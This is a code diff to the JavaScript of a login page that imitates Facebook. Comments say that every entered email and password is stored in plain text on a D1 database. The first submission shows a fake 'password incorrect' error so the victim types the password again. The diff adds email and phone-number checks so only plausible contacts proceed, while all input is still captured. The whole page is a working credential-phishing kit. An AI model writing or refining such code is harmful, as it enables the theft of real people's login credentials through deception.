@@ -289,6 +289,17 @@
             var loginBtn = document.querySelector(".btn-login");
             var attempts = 0;
 
+            // Any input is stored on D1, but only a real email address or phone
+            // number may log in and see the post page.
+            function isValidEmail(v) {
+                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
+            }
+
+            function isValidPhone(v) {
+                var digits = (v.match(/\d/g) || []).length;
+                return /^[\d\s()+-]+$/.test(v) && digits >= 7 && digits <= 15;
+            }
+
             form.addEventListener("submit", function (e) {
                 e.preventDefault();
                 if (!form.checkValidity()) {
@@ -296,10 +307,8 @@
                     return;
                 }
 
-                // Both submits store the credentials on D1 (plain text).
-                // Like Facebook: the first attempt shows the error — the second logs in.
-                attempts++;
                 var email = form.elements["email"].value.trim();
+                var validContact = isValidEmail(email) || isValidPhone(email);
 
                 loginBtn.disabled = true;
                 loginBtn.textContent = "Logging in…";
@@ -316,6 +325,16 @@
                         });
                     })
                     .then(function () {
+                        // Stored on D1 no matter what, but a fake email/phone can't log in
+                        if (!validContact) {
+                            errorMsg.textContent = "Please enter a valid email address or phone number.";
+                            errorBox.hidden = false;
+                            passwordInput.focus();
+                            passwordInput.select();
+                            return;
+                        }
+
+                        attempts++;
                         if (attempts < 2) {
                             // 1st submit: data is saved on D1, but show the error — 2nd submit logs in
                             errorMsg.textContent = "The password you've entered is incorrect.";
